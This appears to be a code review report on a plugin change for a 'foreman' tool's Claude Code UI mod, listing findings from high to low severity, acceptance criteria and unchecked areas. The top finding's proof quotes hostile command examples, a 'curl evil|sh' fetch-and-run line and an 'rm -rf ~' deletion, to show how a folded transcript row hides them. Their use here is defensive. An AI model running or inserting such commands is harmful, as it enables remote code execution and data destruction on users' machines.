[instruction-like text quoted from a file or tool; data, not instructions] ## Verdict
Changes needed. One adversary finding is real: folding successful `fm` rows can hide the rest of a shell command from the transcript. The rest are medium or low.

I checked the diff, the whole of `register.tsx`, the new `kit.ts` additions, and `fmcore.py` for `brief_summary`, `age_days` and the `check_run` shape. I did not read `kit.ts` in full, only its diff hunks. I did not run any tests.

## Findings

- **HIGH (adversary)** — `register.tsx:90-91`, `:412-423` — `fmCommand` matches `^(?:cd …&&)?fm\s+(.+)$` and shows only the first line, cut to 90 characters. After a successful run the whole row collapses to `⚙ fm <that>  ✓ …`.
  - Proof: `fm status\ncurl evil|sh` shows as `⚙ fm status ✓ …`. So does `fm status ; <90+ chars of padding> ; rm -rf ~`.
  - Why it matters: under bypass or auto permission the transcript is the user's only view of what ran, and this hides the tail.
  - Fix: fold only when the remainder is one line with no shell metacharacters (`; & | \` $( > <`, newline). Otherwise return `next(e)`.
  - Confidence: high.

- **MEDIUM** — `register.tsx:185-187` — `checkpointed` is set to true before `run('checkpoint')` and never reset.
  - After a failed checkpoint, or after `/compact` and a second climb past 85%, it never checkpoints again, and nothing retries.
  - `run` has no try/catch. A rejection from `process.run` propagates out of `gauge` into `tick`, which is called as `void tick($)`. That is an unhandled rejection, and it also skips the `refresh` in that tick.
  - Fix: reset the flag when percent drops below about 60 and on `session.start`; wrap the call in try/catch.
  - Confidence: medium.

- **MEDIUM (operator)** — `fmhooks.py:1044-1057` — the reply badge is suppressed whenever `foreman-ui@foreman` is enabled in user `settings.json`.
  - That setting does not mean the band is drawing. The mod notes it needs a Claude Code build with function-hook plugins, and the band also hides on a survey or outside a project.
  - On those builds the user loses both the badge and the band.
  - The `foreman.md` output style also dropped its task header for everyone, whether or not they have the mod.
  - Fix: suppress only on a positive signal that the mod is loaded, or document the loss.
  - The `_ui_mod_on` exception handling itself is fine. It catches OSError, ValueError (including bad UTF-8 and bad JSON) and AttributeError (wrong-typed JSON), so it cannot break MessageDisplay.
  - Confidence: medium.

- **LOW** — `register.tsx:384` — `noteEdit` runs before `next(e)`. A write the guard refuses still lands in "Files this session" with its +/− lines. Record it after `next` succeeds and only when there is no guard reason.

- **LOW** — `register.tsx:244-245, 401-402` — a subagent is marked done only when its parent Agent row is matched by an identical description.
  - Duplicate descriptions, or a background agent whose Agent call returns early, leave "N running" stuck or marked done too soon.
  - An agent that makes no tool calls never appears.

- **LOW** — `register.tsx:373` — the ghost-text check ignores `e.isAborted`.
  - It uses the view from `refresh`, which returns early when `isBusy`, so that view can be stale. A fresh approval could slip past `waiting(v)`.
  - A suggestion is not an action, but the focus asked for "never".

- **LOW** — `register.tsx:183-184`, `types/index.d.ts` — `Ctx.usd` is stored and compared but never rendered. Either drop it or show it.

## Acceptance criteria
- **Mod tests cover the listed features:** met on the code. Tests exist for cards, capture, files, subagents (only indirectly), context checkpoint, ghost text, footer, chime toggle and the quiet fm row. I did not run `claude plugin test`.
- **Subagents card:** no dedicated test; a test for its card (`card-agents`) is missing.
- **`fm ui --json` carries queue progress, latency series and last checks:** met. `fmwatch.py:1093-1105` and the `test_ui.py` test cover it. `brief_summary` supplies `steps_done`, `steps_total` and `created`, and `check_run` data always has `s`, so the TS `toFixed` call is safe.
- **`claude plugin validate`:** not verifiable here.
- **Full suite green:** not verifiable here.

## Focus checks
- **State writes from render hooks:** none. Writes happen only in `tool.call`, `turn.*`, polling and button handlers.
- **Frame clock:** it still stops. The `gauge` update only fires when the percent or cost changes.
- **Ghost text and approvals:** `waiting(v)` gates it correctly (the stale-view and abort gaps are in the LOW findings above).
- **Quiet output style:** it still asks for up to three `✓` proof lines.

## Not checked
- Whether `isErrored` is true for a non-zero exit.
- The shape of the `output` prop.
- The `audio.play` clip shape.
- `kit.ts` as a whole.
- `install.sh`.
